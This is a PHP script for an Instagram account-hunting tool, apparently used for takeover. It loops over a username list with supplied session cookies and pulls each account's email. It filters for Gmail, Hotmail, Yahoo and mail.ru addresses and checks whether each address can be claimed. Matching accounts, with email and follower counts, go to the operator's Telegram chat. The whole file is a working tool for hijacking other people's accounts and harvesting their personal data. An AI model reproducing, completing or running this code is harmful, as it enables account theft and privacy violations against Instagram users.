<?php
date_default_timezone_set('Asia/Baghdad');
$config = json_decode(file_get_contents('config.json'),1);
$id = $config['id'];
$token = $config['token'];
$config['filter'] = $config['filter'] != null ? $config['filter'] : 1;
$screen = file_get_contents('screen');
exec('kill -9 ' . file_get_contents($screen . 'pid'));
file_put_contents($screen . 'pid', getmypid());
include 'index.php';
$accounts = json_decode(file_get_contents('accounts.json') , 1);
$cookies = $accounts[$screen]['cookies'] . $accounts[$screen]['sessionid'];
$useragent = $accounts[$screen]['useragent'];
$users = explode("\n", file_get_contents($screen));
$uu = explode(':', $screen) [0];
$se = 100;
$i = 0;
$nott = 0;
$za = 0;
$gmail = 0;
$hotmail = 0;
$yahoo = 0;
$mailru = 0;
$true = 0;
$false = 0;
$edit = bot('sendMessage',[
    'chat_id'=>$id,
    'text'=>"- بدأ الفحص ✅",
    'parse_mode'=>'markdown',
    'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>'Checked 🔢 : '.$i,'callback_data'=>'fgf']],
                [['text'=>'User Check 🔤 : '.$user,'callback_data'=>'fgdfg']],
                [['text'=>'𝐌𝐀𝐈𝐋: '.$mail,'callback_data'=>'ghj']],
                [['text'=>"Gmail : $gmail",'callback_data'=>'dfgfd'],['text'=>"Yahoo : $yahoo",'callback_data'=>'gdfgfd']],
                [['text'=>'MailRu : '.$mailru,'callback_data'=>'fgd'],['text'=>'Hotmail : '.$hotmail,'callback_data'=>'ghj']],
                  [['text'=>'Not Business ✖️ : '.$nott,'callback_data'=>'hdhdh']],
                        [['text'=>'Business ✔️ : '.$za,'callback_data'=>'hdfhdh']],
 [['text'=>'Vailds ✅ : '.$true,'callback_data'=>'gj']],
     [['text'=>'Blacklist ♻️: '.$bla,'callback_data'=>'pvja']],
     [['text'=>'Not Vailds ❌: '.$false,'callback_data'=>'dghkf']]
            ]
        ])
]);
$se = 100;
$editAfter = 1;
foreach ($users as $user) {
    $info = getInfo($user, $cookies, $useragent);
    if ($info != false ) {
        $mail = trim($info['mail']);
        $usern = $info['user'];
        $e = explode('@', $mail);
               if (preg_match('/(live|hotmail|outlook|yahoo|Yahoo|yAhoo)\.(.*)|(gmail)\.(com)|(mail|bk|yandex|inbox|list)\.(ru)/i', $mail,$m)) {
            echo 'check ' . $mail . PHP_EOL;
            $za +=1;
                    if(checkMail($mail)){
                        $inInsta = inInsta($mail);
                        if ($inInsta !== false) {
                            // if($config['filter'] <= $follow){
                                echo "True - $user - " . $mail . "\n";
                                if(strpos($mail, 'gmail.com')){
                                    $gmail += 1;
                                } elseif(strpos($mail, 'hotmail.') or strpos($mail,'outlook.') or strpos($mail,'live.com')){
                                    $hotmail += 1;
                                } elseif(strpos($mail, 'yahoo')){
                                    $yahoo += 1;
                                } elseif(preg_match('/(mail|bk|yandex|inbox|list)\.(ru)/i', $mail)){
                                    $mailru += 1;
                                }
                                $follow = $info['f'];
                                $following = $info['ff'];
                                $media = $info['m'];
                                bot('sendMessage', ['disable_web_page_preview' => true, 'chat_id' => $id, 'text' => " 𝑯𝑰 { 𝑨𝑳𝑺𝑬𝑨𝑫𝑨 } 𝑵𝑬𝑾 𝑨𝑪𝑪𝑶𝑼𝑵𝑻  ✅ \n━━━━━━━━━━━━━━━\n 💻 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐑 : [$usern](instagram.com/$usern)\n ☎️ 𝐄𝐌𝐀𝐈𝐋 : [$mail]\n ☣️ 𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 : $follow\n ⛑️ 𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆 : $following\n 🛡️ 𝐏𝐎𝐒𝐓 : $media\n ⚖️ 𝐓𝐈𝐌𝐄 : ".date("Y")."/".date("n")."/".date("d")." : " . date('g:i') . "\n" . "━━━━━━━━━━━━━━━\n 𝐁𝐘 :{@ML_C_BOT} 🔱⚜️
𝐂𝐇 :{@QQQVQQQQ} 🔱⚜️",
                                
                                'parse_mode'=>'markdown']);
                                
                                bot('editMessageReplyMarkup',[
                                    'chat_id'=>$id,
                                    'message_id'=>$edit->result->message_id,
                                    'reply_markup'=>json_encode([
                                        'inline_keyboard'=>[
                                            [['text'=>'Checked 🔢 : '.$i,'callback_data'=>'fgf']],
                                            [['text'=>'User Check 🔤 : '.$user,'callback_data'=>'fgdfg']],
                                            [['text'=>'𝐌𝐀𝐈𝐋: '.$mail,'callback_data'=>'ghj']],
                                            [['text'=>"Gmail : $gmail",'callback_data'=>'dfgfd'],['text'=>"Yahoo : $yahoo",'callback_data'=>'gdfgfd']],
                                            [['text'=>'MailRu : '.$mailru,'callback_data'=>'fgd'],['text'=>'Hotmail : '.$hotmail,'callback_data'=>'ghj']],
                                        [['text'=>'Not Business ✔️ : '.$nott,'callback_data'=>'hdhdh']],
                        [['text'=>'Business ✖️ : '.$za,'callback_data'=>'hdfhdh']],
 [['text'=>'Vailds ✅ : '.$true,'callback_data'=>'gj']],
  [['text'=>'Blacklist ♻️ : '.$bla,'callback_data'=>'pvja']],
                                            [['text'=>'Not Vailds ❌ : '.$false,'callback_data'=>'dghkf']]
                                        ]
                                    ])
                                ]);
                                $true += 1;
                            // } else {
                            //     echo "Filter , ".$mail.PHP_EOL;
                            // }
                            
                        } else {
                          echo "No Rest $mail\n";
                        }
                    } else {
                    	$false +=1;
                        echo "Not Vaild 2 - $mail\n";
                    }
        } else {
        $bla +=1;
          echo "BlackList - $mail\n";
        }
    } else {
    		$nott +=1;
        echo "Not Bussines - $user\n";
    }
    usleep(750000);
    $i++;
    if($i == $editAfter){
        bot('editMessageReplyMarkup',[
            'chat_id'=>$id,
            'message_id'=>$edit->result->message_id,
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>'Checked 🔢 : '.$i,'callback_data'=>'fgf']],
                    [['text'=>'On User 🔤 : '.$user,'callback_data'=>'fgdfg']],
                    [['text'=>'𝐌𝐀𝐈𝐋: '.$mail,'callback_data'=>'ghj']],
                    [['text'=>"Gmail : $gmail",'callback_data'=>'dfgfd'],['text'=>"Yahoo : $yahoo",'callback_data'=>'gdfgfd']],
                    [['text'=>'MailRu : '.$mailru,'callback_data'=>'fgd'],['text'=>'Hotmail : '.$hotmail,'callback_data'=>'ghj']],
                     [['text'=>'Not Business ✖️: '.$nott,'callback_data'=>'hdhdh']],
                        [['text'=>'Business ✔️ : '.$za,'callback_data'=>'hdfhdh']],
 [['text'=>'Vailds ✅: '.$true,'callback_data'=>'gj']],
  [['text'=>'Blacklist ♻️: '.$bla,'callback_data'=>'pvja']],
                  [['text'=>'Not Vailds ❌: '.$false,'callback_data'=>'dghkf']]
                ]
            ])
        ]);
        $editAfter += 1;
    }
}
bot('sendMessage', ['chat_id' => $id, 'text' =>"  𝐈𝐌 𝐅𝐈𝐒𝐇𝐈𝐍𝐆 𝐇𝐔𝐍𝐓𝐈𝐍𝐆   : ".explode(':',$screen)[0]]);

